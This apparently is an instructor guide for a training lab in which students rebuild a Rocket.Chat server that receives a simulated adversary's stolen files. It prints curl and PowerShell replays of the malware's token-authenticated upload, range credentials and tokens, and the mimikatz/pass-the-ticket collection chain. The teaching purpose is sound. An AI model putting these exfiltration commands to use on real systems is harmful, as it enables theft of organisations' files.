- `course/operations/csoc_content_range/Range setup/3. RocketChat.md`
- `course/operations/csoc_content_range/Infrastructure_Configs/Range Provisioning Guide.md`
- `course/operations/csoc_content_range/Environment_Overviews/State of the Range - Content Network.md`

This lab does **not** use a classic “find the flag” answer key. Grade **evidence use**, **receiver-stack fidelity to the recovered client contract**, **end-to-end upload proof**, **budget discipline**, and **rehearsal rigor**. Do **not** require one install method (bare metal vs containers) if the contract is met.

**Do not replace L4.0.a.** Assign this brief **or** the document-pipeline L4.0.a brief. Students who received this option must not be handed the other brief’s artifacts (`sync_reports.*`) as a substitute client.

**Student/instructor split:** The student brief must not name Rocket.Chat, version `3.12`, listen port `3000`, room ID, tokens, user IDs, admin credentials, or `/api/v1/rooms.upload/...`. Those values live only here.

## Objective Framing

Students individually reconstruct a lean **threat-representative receiver** for the Seraph-3 / Silent Harvest **Rocket.Chat file-exfil path** they already discovered on `it-wks-01` during Week 1 / Week 3 group activities. They build on **blank** vSphere guests and must land a file using the **captured client contract**, not a console copy onto the chat host.

Success is **not** rebuilding `nisa-dc`, the golden-ticket share path, Havoc, or Apache on the redirector unless a student can justify those as load-bearing for the **upload contract**. Typical justified cut list: victim share, mimikatz/`ticket.kirbi`, SSH backdoor, Havoc agent.

## Scenario (Instructor)

Adversary collection on `it-wks-01` uses a two-stage PowerShell chain under `C:\Windows\System32\Network_Share_Scripts\`:

|Artifact|Role|
|---|---|
|`Network_Share_Setup.ps1`|Stage 1 runner; decodes and invokes the `.b64` payload (range notes also show the full upload logic inlined in this file in some report versions)|
|`Network_Share_login.b64`|Stage 2; Rocket.Chat exfil|
|`Network_setup.exe`|Mimikatz, used to PTT `ticket.kirbi` before reading `\\nisa-dc\CEO_Documents`|
|`lastrun.txt`|Last-run watermark; only files newer than this timestamp are uploaded|
|Scheduled task `\Network_Share_Connection_test` (casing varies in source notes)|Recurring execution (~5 minutes) as `nisa-internal\Lexi.Walsh` via PowerShell 7 (`pwsh.exe`)|

The **receiver** lives on **Redirector-01**:

- Rocket.Chat files under `/opt/Rocket.Chat`
- Listen port **3000/tcp**
- MongoDB backend (room/user lookup)
- systemd unit `rocketchat` (known typo risk: `multi.user.target` instead of `multi-user.target` — service may not start on boot)
    
- Admin `M0ver` / `12345`; regular user `decrypt0r` / `decrypt0rrulez`
    
- Private channel **CEO Uploads**

The captured client does **not** log in with the admin password. It uploads with a **personal access token** and **user id** against `/api/v1/rooms.upload/{roomId}`.

**What students must retarget:** recovered destination host `203.0.113.150:3000` is **outside** the student `/29`. A fresh Rocket.Chat install also **will not** reuse the original room ID, user ID, or PAT. Grade students who discover that mismatch from a failed upload and regenerate / retarget. Do **not** tell them those values in the student brief.

**What is out of scope for a passing reconstruction:** reproducing the Kerberos PTT / `\\nisa-dc\CEO_Documents` collection side. A local test file fed to a retargeted client (or a derived replay of the same REST contract) is an acceptable rehearsal payload. Students who also rebuild the share path may do so only with RAM/rationale discipline.

## Flag / Reference Table (Hiera not used — vSphere lab)

Week 4 opening-block labs are not Puppet/Hiera-driven. Treat the following as the **known-good range defaults**. Live class values may differ if the content range was rotated; prefer student-collected evidence when it conflicts with this table, and record the rotation in the AAR.

|Item|Source / key|Default (content range)|
|---|---|---|
|Rocket.Chat base|Exfil script `$RocketChatUrl`|`203.0.113.150:3000` (scheme often omitted in the recovered script; client must still form a valid HTTP URI — students who add `http://` after a failed call are doing the right engineering)|
|Upload route|Exfil script `Invoke-RestMethod -Uri`|`{base}/api/v1/rooms.upload/{RoomId}`|
|Room ID|`$RoomId`; provisioning notes “CEO Uploads”|`Rnjgmrjyzu4zTyDvz`|
|Auth token|`$AuthToken` / header `X-Auth-Token`|`MhbQ_Bh0ETL6TaEZ_4jZdYT-fJpxlLz-Y9KxbL3B190`|
|User ID|`$UserId` / header `X-User-Id`|`fZvfWT7BbNHDgAgRG`|
|Multipart fields|`-Form`|`file` = file object; `msg` = `Uploaded from ShareDrive (<filename>)`|
|Collection path (client-side)|`$FolderPath`|`\\nisa-dc\CEO_Documents`|
|Last-run file|`$LastRunFile`|`C:\Windows\System32\Network_Share_Scripts\lastrun.txt`|
|RC install path|Range state notes|`/opt/Rocket.Chat`|
|RC listen|Range notes + script|`3000/tcp`|
|RC admin|Range login notes|`M0ver` / `12345` (login docs also show `m0ver` — treat as case-insensitive UI login)|
|RC user|Range login notes|`decrypt0r` / `decrypt0rrulez`|
|Product era|Group-activity target notes / Vulhub sibling|Rocket.Chat **3.12.x** + MongoDB **4.0** (CVE-era stack). Matching 3.12 is high-fidelity; a newer RC that still honors `rooms.upload` + token headers can pass if the student documents the version compromise.|
|Redirector SSH (optional SA)|Hunt notes|User `accesscheck` via recovered ed25519 key — **not required** to rebuild|

## Target Access Enablement

```
remote_access_policy:
  method_family: vsphere-remote-console
  disallow: [gold-image-clone, original-range-as-receiver]
  max_fallbacks: 1
  require_custom_port: false
  required_callback_port: none
```

**Primary (build env):** vCenter UI from the ops station → student folder → **VM Remote Console** for guest install/config.

**Fallback:** instructor-assisted console on a jump host if the student role cannot open Remote Console.

**Mission-path constraint (grade this):** rehearsal delivery is the captured client (or a derived replay of that REST contract) into the receiver in the student `/29`. Pasting a file into the Rocket.Chat UI as an admin, or `scp` into `/opt/Rocket.Chat`, is a fidelity fail unless documented as an explicit out-of-scope shortcut and **not** claimed as SOM proof.

**Ops-station requirements:** browser for vCenter; in-guest tools after OS install. Optional Windows generator VM or ops-station PowerShell 7 (`pwsh`) / `curl` for the upload rehearsal. Do **not** assume Docker Compose unless the instructor staged it in the offline catalog **and** the student can justify it from evidence (range receiver is a systemd host under `/opt/Rocket.Chat`, not a compose lab).

**Network / ports:** student static `/29` in `172.16.45.0/24`. Receiver should listen on the recovered service port (**3000/tcp** in range truth). MongoDB typically `27017/tcp` **on localhost** of the receiver VM — publishing Mongo off-box is unnecessary unless used as a bounds test.

**Credential / artifact handling:** recovered PAT, user ID, and room ID are **original-range** secrets. They will not authenticate a fresh student instance. Students generate new tokens/rooms and retarget the client. Do not issue the original PAT as a “hint.”

**Validation that access enablement works (instructor, pre-class):**

- Student role can create a VM in own folder, mount catalog ISO, power on, open Remote Console.
    
- Offline RC 3.12.x + Mongo 4.0 packages are readable from a test guest (copy via datastore ISO/content library or internal file share — no internet pull).
    

**Cleanup of access artifacts:** no persistent foothold keys are required for this lab. After the grading window, power off / delete student VMs per `environments/effects_lab_env/vsphere/README.md`.

## Pre-Class Staging Checklist

Use the shared checklist in `lab_env/vsphere/README.md`, then complete:

- [ ] Per-student folder named **first name** (last initial only if needed) + **50 GB** resource pool
- [ ] Student RBAC limited to own folder/pool; Remote Console enabled
- [ ] ISO catalog mounted (Linux server required; Windows client useful for a `pwsh` generator; Windows Server optional)
- [ ] Thin templates published if used (base Linux, unjoined Windows) — **unconfigured**, not a Rocket.Chat gold image
- [ ] **Offline software catalog** staged on datastore or internal share (mixed packages; do **not** label the folder `rocketchat-answer`). Minimum for a known-good instructor demo:
    - Rocket.Chat **3.12.x** bundle (or equivalent tarball that unpacks to `/opt/Rocket.Chat`)
    - MongoDB **4.0** packages
    - Matching Node/runtime if the RC bundle does not vendor it
    - Optional: `pwsh` / PowerShell 7 for Windows generator; `curl` is enough for a derived replay
- [ ] Port group(s) for `172.16.44.0/23` verified
- [ ] DHCP confirmed on **`172.16.44.0/24` only**
- [ ] Student static assignment table published (below)
- [ ] Gateway / DNS for `172.16.45.0/24` documented for students
- [ ] This alternative brief assigned (not the document-pipeline L4.0.a brief)
- [ ] Reminder: lecture redirector example ≠ this lab; recovered content-range IPs are **not** in-scope destinations
- [ ] Confirm students still have Week 1/3 notes / exports; if the live content range is still reachable, re-collection from `it-wks-01` is in bounds — **do not** paste the exfil script into the student brief
- [ ] Instructor copy of `course/operations/csoc_content_range/Range setup/Scripts/Exfil script.md` available for **your** live demo only

Record staged paths here before class (facility-specific):

|Package|Staged path|Notes|
|---|---|---|
|Linux ISO|`_TBD_`|Receiver OS|
|Rocket.Chat 3.12.x bundle|`_TBD_`|Prefer unpack-to-`/opt/Rocket.Chat`|
|MongoDB 4.0|`_TBD_`|Replica set required by RC 3.x|
|Optional Windows ISO / pwsh|`_TBD_`|Client generator|

## Student IP Assignment Table

Fill the folder column before class (**first name**; last initial only if needed). Blocks are **/29** in `172.16.45.0/24`. Set gateway/DNS once for the class.

|#|Folder|Block|Usable hosts|Gateway|DNS|
|---|---|---|---|---|---|
|1||`172.16.45.0/29`|`.1`–`.6`|_facility_|_facility_|
|2||`172.16.45.8/29`|`.9`–`.14`|||
|3||`172.16.45.16/29`|`.17`–`.22`|||
|4||`172.16.45.24/29`|`.25`–`.30`|||
|5||`172.16.45.32/29`|`.33`–`.38`|||
|6||`172.16.45.40/29`|`.41`–`.46`|||
|7||`172.16.45.48/29`|`.49`–`.54`|||
|8||`172.16.45.56/29`|`.57`–`.62`|||
|9||`172.16.45.64/29`|`.65`–`.70`|||
|10||`172.16.45.72/29`|`.73`–`.78`|||
|11||`172.16.45.80/29`|`.81`–`.86`|||
|12||`172.16.45.88/29`|`.89`–`.94`|||
|13||`172.16.45.96/29`|`.97`–`.102`|||
|14||`172.16.45.104/29`|`.105`–`.110`|||
|15||`172.16.45.112/29`|`.113`–`.118`|||
|16||`172.16.45.120/29`|`.121`–`.126`|||
|17||`172.16.45.128/29`|`.129`–`.134`|||
|18||`172.16.45.136/29`|`.137`–`.142`|||
|19||`172.16.45.144/29`|`.145`–`.150`|||
|20||`172.16.45.152/29`|`.153`–`.158`|||

Suggested lean layout inside a block (students may remap with rationale):

|Offset|Typical role|
|---|---|
|+1|Receiver (Rocket.Chat + Mongo on one Linux VM)|
|+2|Optional client generator (Windows `pwsh` or Linux `curl`)|
|+3–+6|Unused unless a bounds test needs a second RC build / proxy|

Typical disciplined RAM: **8–16 GB** powered on (RC+Mongo often 4–8 GB; optional Windows generator ~4 GB). Push back on a full AD forest.

## Access Runbook (Ops Station → Student Build Env)

**Primary:** Student logs into vCenter UI from ops station → opens own folder → deploys **blank** VM from catalog ISO / thin template → opens **Remote Console** for guest install/config.

**Fallback:** instructor opens console from jump host; student still performs in-guest configuration.

In-guest verification (required):

```
hostname
whoami
pwd
```

Windows generator equivalents: `hostname`, `whoami`, `cd`.

## Expected Reference Architecture (Not a Mandatory Student Topology)

Lean known-good set:

1. **Linux receiver VM** in the student `/29` running Rocket.Chat 3.12.x bound to `0.0.0.0:3000` with MongoDB 4.0 on localhost, files under `/opt/Rocket.Chat`, systemd unit `rocketchat`.
    
2. **One room** that the client can address by room **ID** (not only by display name). Range display name is `CEO Uploads`; students may use any name if the ID in the client matches.
    
3. **A user + PAT** whose `X-User-Id` / `X-Auth-Token` pair is inserted into the retargeted client.
    
4. **Client generator** (cheap): ops station or a small VM that can run the recovered script (PowerShell 7, because `-Form` on `Invoke-RestMethod` is not Windows PowerShell 5.1) **or** an inspected derived `curl` replay of the same headers and multipart fields.
    

Do **not** publish this topology as the student answer. High-value fidelity: API contract, listen port, token headers, multipart `file`+`msg`, 3.12-era behavior. Cheap approximations: skip victim share, skip Havoc/Apache, skip matching original Mongo ObjectIds.

### Effort vs gain (facilitator board)

**Lots of effort / little gain:** cloning `it-wks-01` + `nisa-dc` + golden ticket just to move one test file; rebuilding Apache/Havoc; matching original room ID bytes in Mongo.

**Little effort / lots of gain:** one Linux RC+Mongo; generate PAT; retarget URL + room + token + user id; prove `success: true` and a visible attachment in the room.

**High value even when RAM is tight:** same API path and headers; document why original IDs fail; one auth-mismatch friction test; one version or port bound.

## Value Provenance (how students know non-default values)

Tie every recovered value to **prior Week 1/3 evidence**, then to why it justifies the next action. Students should write this in the decision record; you use it to catch spoiler-following.

|Value|How students know|Transition reasoning|
|---|---|---|
|Destination host/port `203.0.113.150:3000`|Deobfuscated exfil script `$RocketChatUrl`; live redirector listen table if they surveyed greyspace|That is the **original** receiver. It cannot be the live target for **this** vSphere `/29`. They keep port/protocol fidelity and change the host to their VM.|
|`/api/v1/rooms.upload/$RoomId`|Same script `Invoke-RestMethod -Uri`|First-time seeing a REST upload: this is the **contract** the receiver must honor. Installing “a chat app” that only has a web UI is incomplete until this route accepts the multipart POST.|
|Headers `X-Auth-Token`, `X-User-Id`|Script `$Headers` hashtable|Password login (`M0ver`/`12345`) is how **operators** admin the app, not how **malware** authenticates. Grade the token path for the rehearsal.|
|Room ID `Rnjgmrjyzu4zTyDvz`|Script `$RoomId`; Mongo `rocketchat_room` on the original redirector|Fresh installs mint a **new** ID. Students who paste the original ID into a new RC get 4xx/“room not found.” The recovery action is: look up **their** room ID (UI or Mongo) and retarget.|
|Token / user ID pair|Script variables; RC “Personal Access Tokens” UI on the original|Same mismatch on a new instance. Generate a PAT as the user who can post to the room; copy **both** token and user id.|
|`file` + `msg` form fields|Script `$Form`|Bounds tests that drop `msg` or send a raw body (not multipart) are useful friction — the recovered client uses both fields.|
|Product Rocket.Chat 3.12|Week 3 group-activity notes (exploit against RC 3.12 on the redirector); `/opt/Rocket.Chat` if they had redirector shell; HTTP fingerprint/title if they browsed `:3000`|Evidence-driven product selection. If they missed the product name, they still have the API path — acceptable if they document the gap and still meet the contract.|
|`/opt/Rocket.Chat` + systemd|Redirector filesystem / `systemctl` if surveyed|Nice-to-have fidelity; not required if the listen port and API match and the AAR records the path compromise.|
|`pwsh.exe` / PS7|Scheduled-task action on `it-wks-01`|Explains why a student replay on Windows PowerShell 5.1 may fail (`-Form` missing). Derived `curl` is a valid substitute if they inspected the script first.|

## Recommended Instructor Live Walkthrough

Use this as a **facilitator demo** on a spare `/29` (or a projector VM), not as a student worksheet. Commands below use `172.16.45.1` as the receiver example — replace with the demo block.

**Runtime validation note:** this walkthrough is sourced from the content-range docs and the recovered client. **It has not been executed in the closed training environment by the authoring pass.** Confirm offline package names, systemd unit file, and first-run wizard clicks against the staged 3.12.x bundle before class, and paste any facility-specific deviations into the staging table above.

### 0. Initial situational awareness (receiver guest)

Establish time, identity, session, interpreter, OS, users, processes, and sockets **before** you install anything. Why it matters: students skip this and later cannot tell whether listen `:3000` failed because RC is down, bound to localhost, or colliding with another process.

```
date -u
timedatectl
hostnamectl
hostname
whoami
id
echo "$SHELL"
ps -p $$ -o args=
uname -a
cat /etc/os-release
who
w
ps -ef | head -n 40
ss -tulpen
ss -tupen
```

**First use:**

- `date -u` / `timedatectl` — UTC vs local clock. Upload last-run logic on the **client** is datetime-sensitive; receiver logs are easier to correlate with a known clock.
    
- `hostnamectl` / `hostname` — host identity you will put on the diagram.
    
- `whoami` / `id` — confirm you are installing as root/sudo before you blame “permission denied” on Rocket.Chat.
    
- `echo "$SHELL"` and `ps -p $$ -o args=` — which interpreter will run later `systemctl` / `mongo` snippets (bash vs sh).
    
- `uname -a` and `cat /etc/os-release` — package selection for Mongo/RC must match this guest; do not copy Ubuntu commands onto a RHEL guest blindly.
    
- `who` / `w` — other sessions (instructor assist vs student).
    
- `ps -ef | head -n 40` — **full-ish** process sample before filtering; you are looking for unexpected web/db processes on a “blank” VM.
    
- `ss -tulpen` — listening TCP **and** UDP with processes. Why `-tulpen`: `-t` TCP, `-u` UDP, `-l` listening, `-p` process, `-e` extra, `-n` numeric (no DNS delay). After RC install you expect `3000` and localhost `27017`.
    
- `ss -tupen` — established connections (no `-l`), used later to see the client POST.
    

**Expected findings on a blank guest:** no listener on `3000`; maybe `ssh` on `22` if you enabled it. OS ID matches the ISO you staged. If `3000` is already open, the VM is not blank — stop and rebuild.

### 1. Place the VM on the assigned `/29`

Configure a static address in the student block (example `.1`). Why: recovered `203.0.113.150` is TEST-NET documentation/range greyspace — sending the client there from this cluster will not prove **their** OE.

How students know to pick a new IP: the brief forbids original-range destinations and requires the assigned `/29`. Transition: recovered port and API stay; **host** becomes the VM they just addressed.

### 2. Install MongoDB 4.0 with a replica set

Rocket.Chat 3.x expects Mongo **and** a replica set (oplog). A standalone `mongod` without `rs.initiate` is a common student failure mode (RC crash loop).

Inspect staged packages before installing (offline catalog path from the staging table). Then install per the vendor packages you staged. After `mongod` is running:

```
ss -tulpen
```

Confirm `27017` is listening (preferably `127.0.0.1`, not `0.0.0.0`, unless they split DB onto a second host with rationale).

Initiate the replica set (mongo shell 4.0). **First use:** `mongo` opens the MongoDB shell; `rs.initiate(...)` creates replica set `rs0` with this host as the only member — required so Rocket.Chat can use the oplog.

```
rs.initiate({ _id: "rs0", members: [ { _id: 0, host: "localhost:27017" } ] })
rs.status()
```

**Expected snippet:** `"ok" : 1` from `rs.initiate`, and `rs.status()` showing a PRIMARY. If initiate errors with “already initialized,” inspect `rs.status()` instead of running it again.

**How students know Mongo is in play:** recovered receiver is a multi-component app; Week 3 notes and redirector survey (`mongo` binary, `rocketchat` database) if they had shell. If they only have the HTTP API, they may still install RC’s documented dependency. Grade the **working upload**, not whether they named Mongo in hour one.

### 3. Install Rocket.Chat 3.12.x under `/opt/Rocket.Chat`

Copy the staged bundle and unpack to `/opt/Rocket.Chat` (range path). Create parent directories first if `/opt/Rocket.Chat` does not exist.

Set environment consistent with the recovered cleartext HTTP listener:

- `PORT=3000`
- `ROOT_URL=[http://172.16.45.1:3000](http://172.16.45.1:3000)` (demo IP)
- `MONGO_URL=mongodb://localhost:27017/rocketchat`
- `MONGO_OPLOG_URL=mongodb://localhost:27017/local`

Enable and start the service. **First use:** `systemctl enable --now NAME` enables on boot **and** starts immediately; `systemctl status NAME` is the authoritative unit health view (not just `ps`).

```
sudo systemctl enable --now rocketchat
sudo systemctl status rocketchat --no-pager
ss -tulpen
```

**Expected findings:** unit `active (running)`; `ss` shows `*:3000` or `0.0.0.0:3000`. If the unit is `failed`, do not grep logs first as a jump — read `systemctl status` and the full unit file. Range-known defect: WantedBy `multi.user.target` (typo) instead of `multi-user.target`, so the service does not start on boot.

**How students know port 3000:** `$RocketChatUrl` in the recovered script (host:port). Transition: they observed the client targeting that port, so a receiver listening on 80/443 only is the wrong contract unless they also change the client and document it as a compromise.

Browse `[http://172.16.45.1:3000](http://172.16.45.1:3000)` from the ops station and complete the first- run wizard. Create an admin (range used `M0ver` / `12345` — students may choose their own; matching is optional flavor, not a grade item). Create a room (range name `CEO Uploads`).

### 4. Generate PAT and recover **this instance’s** room ID and user ID

**Personal Access Token (UI):** logged-in user → My Account → Personal Access Tokens → generate. Copy **token** and **user id** together. Why: the malware does not prompt for a password; it presents these two headers on every POST.

**Room ID via Mongo** (range operator method). **First use:** `show dbs` lists databases; `use rocketchat` selects the app DB; `show collections` lists collections; `db.rocketchat_room.find({}, { name: 1 })` projects room name (and by default includes `_id`, which **is** the room ID the API wants).

```
show dbs
use rocketchat
show collections
db.rocketchat_room.find({}, { name: 1 })
db.users.find({}, { username: 1, name: 1, emails: 1 })
```

**Expected snippet (shape, not original IDs):**

```
{ "_id" : "AbCdEf12345678901", "name" : "ceo-uploads" }
{ "_id" : "XyUserIdFromThisVm", "username" : "m0ver" }
```

**How students know to look in Mongo:** range Rocket.Chat notes and/or redirector shell history. Alternate path: Rocket.Chat UI / API `channels.info` or copying the room ID from the browser URL — acceptable if they get the ID the upload route requires.

Do **not** expect the original `Rnjgmrjyzu4zTyDvz` / original PAT to work here. That is the teaching point.

### 5. Inspect the captured client before any replay

On the instructor demo, open the range script (`course/operations/csoc_content_range/Range setup/Scripts/Exfil script.md`). Students inspect **their** recovered copy.

Pre-execution inspection (do this **before** running):

- Identify destination, headers, form fields, and side effects (mimikatz PTT, UNC share, write to `lastrun.txt`).
    
- For rehearsal against a student receiver, **do not** run mimikatz or target `\\nisa-dc\CEO_Documents`. Those steps authenticate to the **victim share**, not to Rocket.Chat.
    
- Confirm the interpreter: **PowerShell 7** (`pwsh`) because `-Form` on `Invoke-RestMethod` is a PowerShell 6+ feature.
    
- Sanity: retarget `$RocketChatUrl` to `[http://172.16.45.1:3000](http://172.16.45.1:3000)` (include a scheme if the recovered string lacks one). Replace `$RoomId`, `$AuthToken`, `$UserId` with **this VM’s** values. Point `$FolderPath` at a local folder containing one test file, or use the derived `curl` below.
    

**First use (`Invoke-RestMethod`):** PowerShell cmdlet that sends an HTTP request and deserializes JSON. `-Uri` is the full upload route; `-Headers` supplies token auth; `-Method Post` is required (the API does not upload on GET); `-Form` builds multipart form-data matching `file` and `msg`.

Minimal derived replay (Linux generator or ops station). **First use:** `curl -X POST` sends the HTTP method; `-H` adds one header per appearance; `-F` adds a multipart field (`file=@path` attaches file contents). `-sS` silences the progress bar but still shows errors.

```
echo 'rehearsal test' > /tmp/share_sample.txt
curl -sS -X POST \
  -H "X-Auth-Token: REPLACE_WITH_VM_TOKEN" \
  -H "X-User-Id: REPLACE_WITH_VM_USERID" \
  -F "file=@/tmp/share_sample.txt" \
  -F "msg=Uploaded from ShareDrive (share_sample.txt)" \
  "http://172.16.45.1:3000/api/v1/rooms.upload/REPLACE_WITH_VM_ROOMID"
```

**How students know these flags/values:** they come from the recovered script (`$Headers`, `$Form`, URI template). Transition: after a failed call with original-range IDs, they substitute **instance-local** IDs they just read from UI/Mongo — that is retargeting, not cheating.

PowerShell 7 equivalent (after retargeting variables):

```
$RocketChatUrl = "http://172.16.45.1:3000"
$RoomId        = "REPLACE_WITH_VM_ROOMID"
$AuthToken     = "REPLACE_WITH_VM_TOKEN"
$UserId        = "REPLACE_WITH_VM_USERID"
$Headers = @{
  "X-Auth-Token" = $AuthToken
  "X-User-Id"    = $UserId
}
$Response = Invoke-RestMethod `
  -Uri "$RocketChatUrl/api/v1/rooms.upload/$RoomId" `
  -Headers $Headers `
  -Method Post `
  -Form @{
    file = Get-Item "/tmp/share_sample.txt"
    msg  = "Uploaded from ShareDrive (share_sample.txt)"
  }
$Response | ConvertTo-Json -Depth 5
```

### 6. Confirm the file landed

**API success shape** (key lines; full JSON is longer than 10 lines — keep `success` and filename):

```
{
  "success": true,
  "message": {
    "file": { "name": "share_sample.txt" }
  }
}
```

Why those lines matter: `success: true` is the client’s own oracle (the malware branches on `$Response.success`). The nested file name proves the multipart field was accepted, not just a chat text message.

**UI:** open the room; attachment visible with the `msg` text prefix `Uploaded from ShareDrive`.

**Optional native evidence:** Rocket.Chat file store under the install tree / GridFS in Mongo. Students should record **which** evidence they used.

Re-check sockets during the POST:

```
ss -tupen
```

Expect an established TCP to `:3000` from the generator.

### 7. Friction inject and bounds test (demo one of each)

**Friction (predicted fail):** replay the same `curl` with the **original range** token/room ID against the student VM.

Expected: HTTP 401/403 or JSON `success: false` / “unauthorized” / “invalid room”. Why it matters: proves the original secrets are bound to the original instance; retargeting is mandatory.

**Bounds (pick one):**

- Stop `rocketchat` (`systemctl stop rocketchat`) and retry — connection refused; maps the service as load-bearing.
    
- Listen on `3001` but leave the client on `3000`.
    
- Upload an oversized or disallowed type if the 3.12 settings reject it.
- Use HTTP vs HTTPS depending on what the recovered client actually sent (range client is cleartext HTTP to `:3000`).

Record predicted vs observed; tag ATT&CK (at minimum T1041 Exfiltration Over C2 Channel and T1071.001 Web Protocols; collection T1005 / T1039 as applicable). Pair D3FEND/ENGAGE language for “file inspection” or “credential-based restriction” if friction was auth or content reject.

### 8. Snapshot and AAR close

Take a named pre-rehearsal snapshot **before** destructive bounds tests. AAR must include: values retargeted; proof of land; friction; envelope; compromises (for example “did not rebuild `\\nisa-dc`”; “used curl derived from the script”; “RC 3.12 vs newer”).

## Grading Checkpoints

Map to rubric row IDs in [L4.0.a Alternative Assessment Rubric.md](https://moodle.cso.ops/mod/assign/view.php?id=5712).

|Checkpoint|Evidence|Rubric|
|---|---|---|
|Evidence-to-build linkage|Decision record cites Week 1/3 artifacts for product/API/auth/port; gaps named|ES-1|
|Keep/cut rationale|Victim share / golden ticket / Havoc cut unless justified; receiver kept|ES-2|
|Path fidelity|Rehearsal is client POST, not console/UI file drop claimed as SOM|ES-3|
|Dest retarget|AAR shows host moved into `/29`; original `203.0.113.150` not left as live dest|ES-4|
|Auth contract|Token + user id headers; room ID from **this** instance|ES-5|
|Successful land|`success: true` and/or room attachment evidence|ES-6|
|Journal quality|Ordered install steps tied to evidence, not a generic blog paste|ES-7|
|Friction + bounds|At least one predicted fail and one envelope test|ES-8|
|Budget / addressing|RAM table ≤ ~50 GB; static IPs in assigned `/29`|ES-9|
|Snapshots|Named pre-rehearsal snapshot|ES-10|
|Compromises + plan delta|AAR bounds claims; SOM/TTP change recorded|ES-11|
|Doctrine + MITRE pairing|SOM/CG/CV language plus ATT&CK tags|ES-12|

**Acceptable-answer guidance:**

- **Pass:** RC (3.12 preferred) accepts multipart `rooms.upload` with token headers from a retargeted recovered client or inspected derived replay; file visible; original-range dest not used; keep/cut list exists.
    
- **Do not fail** solely for: not matching original room ID string; not installing at `/opt/Rocket.Chat`; not rebuilding the UNC share; using `curl` after inspecting the script; choosing a newer RC if they document API-contract testing.
    
- **Fail:** instructor-fed product/API details with no evidence trail; claiming UI drag-and-drop as the SOM; still targeting `203.0.113.150`; no upload evidence; vanity AD/C2 farm with no receiver.
    

## Facilitator Notes — Common Mistakes

|Pattern|Why it fails the objective|Instructor push-back|
|---|---|---|
|Asks you for the product / PAT / room ID|Brief forbids spoiling Week 1/3 collection|“What’s in your recovered script and hunt notes?”|
|Rebuilds full Lunovia + greyspace|Volume ≠ load-bearing receive contract|“Which recovered client field dies without that host?”|
|Gold-image clone of redirector|Skips OE selection|Blank VMs only; justify each package from evidence|
|Client unchanged (`203.0.113.150`)|Dest is not their OE|Retarget host; keep contract|
|Pastes original room ID/token into new RC|IDs are instance-specific|Generate PAT; Mongo/UI lookup of **this** room|
|Admin UI file upload as “success”|Wrong TTP|“Did the recovered client land it?”|
|Windows PowerShell 5.1 `-Form`|Cmdlet parameter does not exist|`pwsh` or derived `curl` after inspection|
|Runs mimikatz / PTT in the classroom OE|Victim-side, out of scope, noisy|Local test file; skip golden ticket|
|Mongo without replica set|RC 3.x will not stay healthy|`rs.initiate`|
|RC on 80 only|Recovered client uses `:3000`|Match port or document a client change as compromise|
|Docker compose because Week 2 Vulhub exists|Not the range receiver shape; Docker may be absent|Allowed only if staged **and** they bound the compromise|
|Static IP in `172.16.44.0/24`|DHCP collision|Move into assigned `/29`|
|No ATT&CK tags|Breaks bilingual fluency|Tag exfil/web-protocol techniques|
|Leaving everything powered on|Starves L4.0.b|Power off idle VMs|

## Troubleshooting (Consolidated)

Do not scatter these into walkthrough steps during grading.

- **Cannot power on:** Pool at 50 GB; power off idle VMs; drop guest RAM.
- **Console gray:** Student role missing Remote Console; use fallback; check VM tools / host console service.
    
- **No DHCP in upper half:** Expected — static in `172.16.45.0/24`.
    
- **ISO / package missing:** Content library permissions; remount datastore; confirm offline catalog path from the staging table.
    
- **Student wants nested ESXi or internet pull:** Out of scope.
    
- **Student rebuilds the lecture PHP redirector or the other L4.0.a SFTP pipeline:** Redirect to **this** FRAGO — captured Week 1/3 exfil client, not those scenarios.
    
- **Rocket.Chat unit fails on boot:** Check `WantedBy=` for `multi.user.target` typo; fix to `multi-user.target`; `daemon-reload`; enable --now.
    
- **RC crash loop:** Mongo down or replica set not initiated; `ROOT_URL` / `MONGO_URL` wrong; insufficient RAM.
    
- **Upload 401 / invalid token:** Using original-range PAT on a new instance, or token/user id pair split across two users.
    
- **Upload 400 / room not found:** Original room ID pasted; room is private and the token user is not a member.
    
- **`Invoke-RestMethod: A parameter cannot be found that matches parameter name 'Form'`:** Windows PowerShell 5.1 — switch to `pwsh` or `curl`.
    
- **Invalid URI:** Recovered `$RocketChatUrl` lacks `http://` — add scheme when retargeting.
    
- **`lastrun.txt` access denied:** Range note: hidden `lastrun.txt` can deny writes. For this lab, use a local last-run path on the generator or a one-shot derived replay.
    
- **`curl` succeeds, recovered script fails:** Script still PTT/share-bound, still pointed at greyspace, or running under 5.1. Inspect the live variables they actually executed.
    
- **Success JSON but nothing in UI:** Wrong room ID (posted elsewhere) or viewing as a user who cannot see the private room.
    

## Cleanup

After the grading window: archive or delete student VMs; leave ISO catalog, thin templates, and the mixed offline package share; reset the assignment table. See shared cleanup SOP in `lab_env/vsphere/README.md`. Power off this alternative’s VMs before L4.0.b if RAM is tight — same rule as L4.0.a.

No lab-specific foothold keys to revoke. If students generated Rocket.Chat PATs, they die with the VM.

## Link to Course Objectives

- Applies Week 1 planning products without re-teaching them.
- Converts Week 1/3 **collection** into a **rebuildable receive path** — the same fidelity/compromise skills as the lecture, on different terrain from both the PHP-redirector example and the SFTP document-pipeline L4.0.a.
    
- Prepares honest terrain for later effects (4.1+) by forcing OE discipline on a stack students already have evidence for.
    
- Sets documentation and rollback habits reused in L4.0.b peer handoff.